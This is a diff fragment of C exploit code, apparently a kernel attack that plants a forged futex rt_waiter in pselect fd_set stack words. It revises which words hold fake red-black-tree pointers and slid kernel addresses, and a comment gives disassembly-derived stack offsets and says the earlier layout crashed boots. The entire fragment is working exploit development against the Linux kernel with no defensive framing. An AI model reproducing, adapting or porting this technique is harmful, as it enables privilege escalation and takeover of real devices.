@@ -202,26 +202,30 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
   uint64_t mirror_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
 
+  /* z3q stack geometry, disasm-derived (see PORTING.md §7):
+   *   waiter (do_futex rt_waiter @SP0-0x190) - pselect fd buf (@SP0-0x210)
+   *   = DELTA 0x80, so waiter field F = fdset word (0x80+F)/8.
+   *   tree_entry.parent_color = word 10, .rb_right = 11, .rb_left = 12;
+   *   pi_tree_entry.parent_color = 13, .rb_right = 14; pi .rb_left = 15
+   *   (res_out region: kernel-zeroed, pi erase takes the no-child path).
+   *   task/lock sit past the plantable window in res_ex — do not plant.
+   * The old k40 table put wake_state(3) on word 13 = pi_tree
+   * parent_color: the pi erase then read [0x13] and panicked the boot
+   * (runs 1-8, the final unknown failure). */
   int words_per_set = slide_pselect_words_per_set();
   struct slide_waiter_word {
     int word;
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, loggers, "tree_pc"},
-    {1, 0, "tree_right"},
-    {2, bootid_data, "tree_left"},
-    {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, loggers, "pi0"},
-    {6, 0, "pi1"},
-    {7, bootid_data, "pi2"},
-    {8, FAKE_WAITER_PRIO, "pi_prio"},
-    {9, 0, "pi_deadline"},
-    {10, init_task, "task"},
-    {11, mirror_lock, "lock"},
-    {12, 3, "wake_state"},
-    {13, 0, "ww_ctx"},
+    {10, loggers, "tree_pc"},
+    {11, 0, "tree_right"},
+    {12, bootid_data, "tree_left"},
+    {13, loggers, "pi_pc"},
+    {14, 0, "pi_right"},
   };
+  (void)init_task;
+  (void)mirror_lock;
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
     slide_pselect_put_waiter_word(
